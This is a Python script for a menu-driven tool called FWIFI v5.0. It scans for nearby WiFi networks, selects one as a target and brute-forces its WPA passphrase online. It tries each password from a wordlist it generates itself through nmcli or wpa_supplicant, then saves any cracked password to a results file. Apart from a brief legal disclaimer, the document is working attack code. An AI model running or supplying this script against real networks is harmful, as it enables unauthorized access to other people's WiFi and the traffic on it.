#!/usr/bin/env python3
"""
FWIFI - WiFi Security Assessment Tool v5.0
Using iwconfig/nmcli for reliable password testing
"""

import time
import os
import sys
import subprocess
import re
from datetime import datetime

# Simple colors
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
B = "\033[94m"
P = "\033[95m"
C = "\033[96m"
W = "\033[97m"
X = "\033[0m"
GR = "\033[90m"

# Global state
class State:
    def __init__(self):
        self.ssid = None
        self.bssid = None
        self.signal = None
        self.wordlist = "wordlists/default.txt"
        self.found = False
        self.password = None
        self.attempts = 0
        self.start_time = 0
        self.interface_name = None
        self.testing = False

state = State()

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_status(msg, status="info"):
    icons = {
        "info": f"{C}[*]{X}",
        "success": f"{G}[+]{X}",
        "error": f"{R}[-]{X}",
        "warning": f"{Y}[!]{X}",
        "question": f"{B}[?]{X}"
    }
    print(f"{icons.get(status, icons['info'])} {msg}")

def print_line():
    print("─" * 50)

def detect_interfaces():
    """Detect WiFi interfaces"""
    interfaces = []
    try:
        result = subprocess.run(['iwconfig'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if 'IEEE 802.11' in line:
                parts = line.split()
                if parts:
                    iface = parts[0]
                    if iface not in ['lo', 'ens160', 'eth0', 'docker0']:
                        if iface not in interfaces:
                            interfaces.append(iface)
        return interfaces
    except:
        return []

def get_interface_status(iface):
    """Get interface status"""
    try:
        result = subprocess.run(['iwconfig', iface], capture_output=True, text=True)
        if 'Access Point: Not-Associated' in result.stdout:
            return "Not connected"
        elif 'Access Point:' in result.stdout and 'Not-Associated' not in result.stdout:
            return "Connected"
        return "Unknown"
    except:
        return "Unknown"

def select_interface():
    """Select WiFi interface"""
    interfaces = detect_interfaces()
    
    if not interfaces:
        print_status("No wireless interfaces detected", "error")
        return False
    
    print(f"\n{C}Detected WiFi Interfaces:{X}")
    print_line()
    for i, iface in enumerate(interfaces, 1):
        status = get_interface_status(iface)
        print(f"  {G}{i}.{X} {iface} {GR}({status}){X}")
    print_line()
    
    try:
        choice = input(f"{Y}[?] Select interface (1-{len(interfaces)}): {X}").strip()
        idx = int(choice) - 1
        
        if 0 <= idx < len(interfaces):
            state.interface_name = interfaces[idx]
            print_status(f"Selected: {G}{state.interface_name}{X}", "success")
            return True
        else:
            print_status("Invalid selection", "error")
            return False
    except ValueError:
        print_status("Invalid input - enter a number", "error")
        return False
    except KeyboardInterrupt:
        return False

def check_system():
    """Check system requirements"""
    if os.name == 'posix' and os.geteuid() != 0:
        print_status("This tool requires root privileges", "error")
        print_status(f"Run: sudo python3 {sys.argv[0]}", "warning")
        return False
    
    # Check for required tools
    for cmd in ['iwconfig', 'iw', 'nmcli']:
        if not subprocess.run(['which', cmd], capture_output=True).returncode == 0:
            print_status(f"Warning: {cmd} not found", "warning")
    
    if not state.interface_name:
        if not select_interface():
            return False
    
    return True

def legal_warning():
    """Display legal disclaimer"""
    clear()
    print(f"""
{R}╔════════════════════════════════════════════╗
║         LEGAL DISCLAIMER                   ║
╚════════════════════════════════════════════╝{X}

{Y}THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY!{X}

{G}✓ Legal Uses:{X}
  • Testing your own networks
  • Authorized penetration testing

{R}✗ Illegal Uses:{X}
  • Unauthorized network access
  • Any malicious activity

{Y}Continue? (yes/no): {X}""")
    
    response = input().strip().lower()
    return response in ['y', 'yes', '1']

def create_wordlists():
    """Create wordlists"""
    os.makedirs("wordlists", exist_ok=True)
    os.makedirs("results", exist_ok=True)
    
    default_path = "wordlists/default.txt"
    if not os.path.exists(default_path):
        print_status("Creating default wordlist...", "info")
        passwords = [
            "123456", "password", "12345678", "qwerty", "123456789",
            "12345", "1234", "111111", "1234567", "dragon",
            "123123", "baseball", "abc123", "football", "monkey",
            "letmein", "696969", "shadow", "master", "666666",
        ]
        with open(default_path, 'w') as f:
            for pwd in passwords:
                f.write(f"{pwd}\n")
        print_status(f"Created wordlist with {len(passwords)} passwords", "success")
    
    state.wordlist = default_path

def scan_networks():
    """Scan for networks using iwlist"""
    try:
        print_status(f"Scanning for networks on {state.interface_name}...", "info")
        
        # Bring interface up
        subprocess.run(['sudo', 'ip', 'link', 'set', state.interface_name, 'up'], 
                      check=False, capture_output=True)
        time.sleep(1)
        
        # Scan
        result = subprocess.run(['sudo', 'iwlist', state.interface_name, 'scan'], 
                              capture_output=True, text=True, timeout=20)
        
        if result.returncode != 0:
            return []
        
        networks = []
        current = {}
        
        for line in result.stdout.split('\n'):
            line = line.strip()
            
            if 'Cell' in line and 'Address' in line:
                if current and 'ssid' in current:
                    networks.append(current)
                current = {}
                match = re.search(r'Address: ([0-9A-Fa-f:]{17})', line)
                if match:
                    current['bssid'] = match.group(1)
            
            elif 'ESSID:' in line:
                match = re.search(r'ESSID:"([^"]*)"', line)
                if match:
                    ssid = match.group(1)
                    if ssid:
                        current['ssid'] = ssid
                    else:
                        current['ssid'] = "Hidden"
            
            elif 'Quality' in line:
                match = re.search(r'Quality=(\d+)/(\d+)', line)
                if match:
                    current['quality'] = int(match.group(1))
                    current['max'] = int(match.group(2))
        
        if current and 'ssid' in current:
            networks.append(current)
        
        if networks:
            print_status(f"Found {len(networks)} networks", "success")
        
        return networks
        
    except Exception as e:
        print_status(f"Scan error: {str(e)}", "error")
        return []

def show_networks(networks):
    """Display networks"""
    if not networks:
        print_status("No networks found", "error")
        return
    
    print(f"\n{C}Available Networks:{X}")
    print_line()
    print(f"{C}{'No.':<4} {'SSID':<30} {'Signal':<8} {'BSSID':<18}{X}")
    print_line()
    
    for i, net in enumerate(networks, 1):
        ssid = net.get('ssid', 'Unknown')
        bssid = net.get('bssid', 'Unknown')
        quality = net.get('quality', 0)
        max_qual = net.get('max', 100)
        signal = int(quality / max_qual * 100) if max_qual > 0 else 0
        
        color = G if signal > 70 else Y if signal > 40 else R
        display_ssid = ssid[:28] + ".." if len(ssid) > 30 else ssid.ljust(30)
        
        print(f" {C}{i:>3}.{X} {display_ssid} {color}{signal:>3}%{X}  {GR}{bssid}{X}")

def select_target():
    """Select target network"""
    networks = scan_networks()
    if not networks:
        return False
    
    show_networks(networks)
    
    while True:
        try:
            choice = input(f"\n{Y}[?] Select network (0=rescan, -1=cancel): {X}").strip()
            
            if choice == "0":
                return select_target()
            elif choice == "-1":
                return False
            
            idx = int(choice) - 1
            if 0 <= idx < len(networks):
                net = networks[idx]
                state.ssid = net.get('ssid', 'Unknown')
                state.bssid = net.get('bssid', 'Unknown')
                quality = net.get('quality', 0)
                max_qual = net.get('max', 100)
                state.signal = int(quality / max_qual * 100) if max_qual > 0 else 0
                
                print_status(f"Selected: {G}{state.ssid}{X}", "success")
                return True
            else:
                print_status("Invalid selection", "error")
                
        except ValueError:
            print_status("Enter a number", "error")
        except KeyboardInterrupt:
            return False

def test_password_iwconfig(password):
    """
    Test password using iwconfig and wpa_supplicant
    This is more reliable than pywifi
    """
    if not state.interface_name or not state.ssid:
        return False
    
    try:
        # Step 1: Disconnect from any network
        subprocess.run(['sudo', 'iwconfig', state.interface_name, 'ap', 'any'], 
                      check=False, capture_output=True)
        subprocess.run(['sudo', 'ip', 'link', 'set', state.interface_name, 'down'], 
                      check=False, capture_output=True)
        time.sleep(0.5)
        subprocess.run(['sudo', 'ip', 'link', 'set', state.interface_name, 'up'], 
                      check=False, capture_output=True)
        time.sleep(0.5)
        
        # Step 2: Kill wpa_supplicant for this interface
        subprocess.run(['sudo', 'killall', 'wpa_supplicant'], check=False, capture_output=True)
        time.sleep(0.5)
        
        # Step 3: Create wpa_supplicant config
        config = f"""ctrl_interface=/var/run/wpa_supplicant
network={{
    ssid="{state.ssid}"
    psk="{password}"
    key_mgmt=WPA-PSK
    proto=RSN WPA
    pairwise=CCMP TKIP
    group=CCMP TKIP
}}
"""
        with open('/tmp/wpa.conf', 'w') as f:
            f.write(config)
        
        # Step 4: Start wpa_supplicant with config
        subprocess.run(['sudo', 'wpa_supplicant', '-B', '-i', state.interface_name, 
                       '-c', '/tmp/wpa.conf'], check=False, capture_output=True)
        time.sleep(1)
        
        # Step 5: Get DHCP
        subprocess.run(['sudo', 'dhclient', '-r', state.interface_name], 
                      check=False, capture_output=True)
        time.sleep(0.5)
        subprocess.run(['sudo', 'dhclient', state.interface_name], 
                      check=False, capture_output=True)
        time.sleep(2)
        
        # Step 6: Check if connected
        result = subprocess.run(['iwconfig', state.interface_name], 
                              capture_output=True, text=True)
        
        if 'Access Point: Not-Associated' in result.stdout:
            # Not connected
            return False
        
        # Check if we have an IP
        ip_result = subprocess.run(['ip', 'addr', 'show', state.interface_name], 
                                 capture_output=True, text=True)
        if 'inet ' in ip_result.stdout:
            # Connected and has IP!
            return True
        
        return False
        
    except Exception as e:
        return False
    finally:
        # Cleanup
        try:
            subprocess.run(['sudo', 'killall', 'wpa_supplicant'], check=False, capture_output=True)
            subprocess.run(['sudo', 'dhclient', '-r', state.interface_name], 
                          check=False, capture_output=True)
            subprocess.run(['sudo', 'iwconfig', state.interface_name, 'ap', 'any'], 
                          check=False, capture_output=True)
        except:
            pass

def test_password_nmcli(password):
    """
    Alternative: Test password using nmcli
    """
    try:
        # Remove existing connection
        subprocess.run(['sudo', 'nmcli', 'connection', 'delete', state.ssid], 
                      check=False, capture_output=True)
        time.sleep(0.5)
        
        # Create connection
        cmd = ['sudo', 'nmcli', 'device', 'wifi', 'connect', state.ssid, 
               'password', password]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
        
        if 'successfully' in result.stdout.lower() or 'activated' in result.stdout.lower():
            return True
        
        # Check if actually connected
        time.sleep(2)
        result2 = subprocess.run(['nmcli', 'device', 'status'], 
                               capture_output=True, text=True)
        if state.ssid in result2.stdout and 'connected' in result2.stdout.lower():
            return True
        
        return False
        
    except Exception as e:
        return False
    finally:
        # Cleanup
        try:
            subprocess.run(['sudo', 'nmcli', 'connection', 'delete', state.ssid], 
                          check=False, capture_output=True)
        except:
            pass

def test_password(password):
    """Test password using available methods"""
    # Try nmcli first (more reliable)
    if subprocess.run(['which', 'nmcli'], capture_output=True).returncode == 0:
        return test_password_nmcli(password)
    else:
        # Fallback to iwconfig method
        return test_password_iwconfig(password)

def brute_force():
    """Main attack with proper password testing"""
    if not state.ssid:
        print_status("No target selected", "error")
        return
    
    try:
        with open(state.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print_status(f"Failed to load wordlist: {str(e)}", "error")
        return
    
    if not passwords:
        print_status("Wordlist is empty", "error")
        return
    
    # Check if nmcli is available
    use_nmcli = subprocess.run(['which', 'nmcli'], capture_output=True).returncode == 0
    
    print(f"\n{R}╔═══════════════════════════════════════════╗")
    print(f"║    ATTACKING: {state.ssid:<20}║")
    print(f"╚═══════════════════════════════════════════╝{X}")
    print(f"{C}Total Passwords:{X} {len(passwords)}")
    print(f"{C}Method:{X} {'nmcli' if use_nmcli else 'iwconfig'}")
    print(f"{C}Start Time:{X} {datetime.now().strftime('%H:%M:%S')}")
    print()
    print(f"{Y}⚠️  Each password takes ~5-10 seconds to test{X}")
    print(f"{Y}⚠️  Total time: ~{len(passwords) * 7 / 60:.1f} minutes{X}")
    print()
    
    confirm = input(f"{Y}[?] Start attack? (y/n): {X}").lower()
    if confirm not in ['y', 'yes']:
        print_status("Cancelled", "warning")
        return
    
    state.found = False
    state.password = None
    state.attempts = 0
    state.start_time = time.time()
    
    print(f"\n{C}Starting attack... Press Ctrl+C to stop{X}")
    print_line()
    
    try:
        for idx, pwd in enumerate(passwords, 1):
            state.attempts = idx
            
            # Calculate progress
            progress = (idx / len(passwords)) * 100
            elapsed = time.time() - state.start_time
            speed = idx / elapsed if elapsed > 0 else 0
            
            # Show current password being tested
            print(f"\r{C}[{idx:05d}/{len(passwords):05d}] {progress:5.1f}% | "
                  f"{speed:.2f} pwd/s | Testing: {pwd[:25]:<25}{X}", 
                  end='', flush=True)
            
            # Test the password
            if test_password(pwd):
                state.found = True
                state.password = pwd
                print(f"\n\n{G}✓ Password found!{X}")
                break
            
            # Small delay between attempts
            time.sleep(0.5)
    
    except KeyboardInterrupt:
        print(f"\n\n{Y}[!] Attack interrupted at password #{state.attempts}{X}")
        return
    
    print("\n")
    print_line()
    
    if state.found:
        save_result()
        print(f"\n{G}🎉 PASSWORD FOUND!{X}")
        print(f"{C}Network:{X} {W}{state.ssid}{X}")
        print(f"{C}Password:{X} {G}{state.password}{X}")
        print(f"{C}Attempts:{X} {state.attempts}")
        print(f"{C}Time:{X} {time.time() - state.start_time:.1f}s")
        print(f"{C}Speed:{X} {state.attempts / (time.time() - state.start_time):.2f} pwd/s")
    else:
        print(f"\n{R}❌ ATTACK FAILED{X}")
        print(f"{C}Network:{X} {state.ssid}")
        print(f"{C}Attempted:{X} {state.attempts} passwords")
        print(f"{C}Time:{X} {time.time() - state.start_time:.1f}s")
        print(f"{Y}No valid password found in wordlist{X}")
        print(f"\n{Y}💡 Suggestions:{X}")
        print(f"  • Add more passwords to your wordlist")
        print(f"  • Check if network uses WPA2 or WPA3")
        print(f"  • Make sure you're in range of the network")
        print(f"  • Try using nmcli: sudo apt install network-manager")
    
    input(f"\n{Y}Press Enter to continue...{X}")

def save_result():
    """Save results"""
    try:
        safe_ssid = "".join(c for c in state.ssid if c.isalnum() or c in ('_', '-'))
        if not safe_ssid:
            safe_ssid = "Hidden"
        
        filename = f"results/{safe_ssid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
            f.write("=" * 50 + "\n")
            f.write("FWIFI - SUCCESSFUL CRACK\n")
            f.write("=" * 50 + "\n\n")
            f.write(f"Network:      {state.ssid}\n")
            f.write(f"BSSID:        {state.bssid}\n")
            f.write(f"Password:     {state.password}\n")
            f.write(f"Signal:       {state.signal}%\n")
            f.write(f"Attempts:     {state.attempts}\n")
            f.write(f"Time:         {time.time() - state.start_time:.1f}s\n")
            f.write(f"Date:         {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        
        print_status(f"Results saved to {filename}", "success")
    except Exception as e:
        print_status(f"Failed to save results: {str(e)}", "error")

def set_wordlist():
    """Set wordlist"""
    if os.path.exists("wordlists"):
        files = [f for f in os.listdir("wordlists") if f.endswith('.txt')]
        if files:
            print(f"\n{C}Available wordlists:{X}")
            print_line()
            for i, f in enumerate(files, 1):
                size = os.path.getsize(f"wordlists/{f}") / 1024
                current = " (CURRENT)" if f"wordlists/{f}" == state.wordlist else ""
                print(f"  {G}{i}.{X} {f} ({size:.1f} KB){current}")
            print_line()
            
            try:
                sel = input(f"{Y}[?] Select (1-{len(files)}) or Enter to cancel: {X}").strip()
                if sel:
                    idx = int(sel) - 1
                    if 0 <= idx < len(files):
                        state.wordlist = f"wordlists/{files[idx]}"
                        print_status(f"Selected: {files[idx]}", "success")
                        time.sleep(1)
            except:
                pass

def show_info():
    """Show info"""
    print(f"\n{C}Current Information:{X}")
    print_line()
    print(f"{C}Interface:{X} {state.interface_name}")
    print(f"{C}Target:{X} {state.ssid if state.ssid else 'Not set'}")
    print(f"{C}BSSID:{X} {state.bssid if state.bssid else 'Not set'}")
    print(f"{C}Signal:{X} {state.signal}%")
    print(f"{C}Wordlist:{X} {state.wordlist}")
    if os.path.exists(state.wordlist):
        with open(state.wordlist, 'r') as f:
            count = sum(1 for _ in f)
        print(f"{C}Passwords:{X} {count}")
    
    # Check if nmcli is available
    if subprocess.run(['which', 'nmcli'], capture_output=True).returncode == 0:
        print(f"{C}Method:{X} nmcli (recommended)")
    else:
        print(f"{C}Method:{X} iwconfig")
        print(f"{Y}💡 Install nmcli: sudo apt install network-manager{X}")
    
    print_line()
    input(f"{Y}Press Enter to continue...{X}")

def show_help():
    """Show help"""
    print(f"""
{C}Basic Workflow:{X}
  1. Select Interface (Option 4)
  2. Scan Networks (Option 1)
  3. Select Target (Option 2)
  4. Start Attack (Option 5)

{C}Password Testing Methods:{X}
  • nmcli (recommended) - More reliable
  • iwconfig (fallback) - Works without NetworkManager

{C}Why Was It Skipping?{X}
  • pywifi was failing silently
  • Now using system tools directly
  • Each password is actually tested

{C}Install nmcli for Better Results:{X}
  sudo apt install network-manager
  sudo systemctl start NetworkManager

{R}Legal Warning:{X} Only test networks you own!
""")
    input(f"{Y}Press Enter to continue...{X}")

def test_scan_direct():
    """Test scan directly"""
    print_status(f"Testing scan on {state.interface_name}...", "info")
    print_line()
    
    result = subprocess.run(['sudo', 'iwlist', state.interface_name, 'scan'], 
                          capture_output=True, text=True)
    
    if result.returncode == 0:
        count = result.stdout.count('ESSID:')
        print_status(f"Found {count} networks", "success" if count > 0 else "warning")
        if count > 0:
            print("\n" + "="*50)
            for line in result.stdout.split('\n'):
                if 'ESSID:' in line or 'Quality' in line:
                    print(line.strip())
            print("="*50)
    else:
        print_status("Scan failed", "error")
    
    print_line()
    input(f"{Y}Press Enter to continue...{X}")

def main():
    """Main entry point"""
    try:
        if not check_system():
            sys.exit(1)
        
        if not legal_warning():
            print_status("Consent not given. Exiting.", "warning")
            sys.exit(0)
        
        create_wordlists()
        
        while True:
            clear()
            print(f"""
{R}╔════════════════════════════════════════════╗
║     FWIFI v5.0 - Fixed Attack             ║
║     Using System Tools (nmcli/iwconfig)   ║
╚════════════════════════════════════════════╝{X}
{C}Interface: {G}{state.interface_name}{X}
{C}Target: {G}{state.ssid if state.ssid else 'Not set'}{X}
{C}Wordlist: {G}{os.path.basename(state.wordlist)}{X}
""")
            
            print(f"{C}Main Menu:{X}")
            print_line()
            print(f"  {G}1.{X} Scan Networks")
            print(f"  {G}2.{X} Select Target")
            print(f"  {G}3.{X} Set Wordlist")
            print(f"  {G}4.{X} Select Interface")
            print(f"  {G}5.{X} Start Attack")
            print(f"  {G}6.{X} Show Info")
            print(f"  {G}7.{X} Help")
            print(f"  {G}8.{X} Debug Scan")
            print(f"  {R}9.{X} Exit")
            print_line()
            
            choice = input(f"\n{Y}[?] Select option (1-9): {X}").strip()
            
            if choice == "1":
                networks = scan_networks()
                if networks:
                    show_networks(networks)
                else:
                    print_status("No networks found", "warning")
                input(f"\n{Y}Press Enter to continue...{X}")
            
            elif choice == "2":
                select_target()
            
            elif choice == "3":
                set_wordlist()
            
            elif choice == "4":
                select_interface()
            
            elif choice == "5":
                brute_force()
            
            elif choice == "6":
                show_info()
            
            elif choice == "7":
                show_help()
            
            elif choice == "8":
                test_scan_direct()
            
            elif choice == "9":
                print_status("Goodbye!", "info")
                sys.exit(0)
            
            else:
                print_status("Invalid choice", "error")
                time.sleep(1)
    
    except KeyboardInterrupt:
        print(f"\n{R}[!] Tool terminated{X}")
        sys.exit(0)
    except Exception as e:
        print(f"{R}[!] Error: {str(e)}{X}")
        sys.exit(1)

if __name__ == "__main__":
    main()
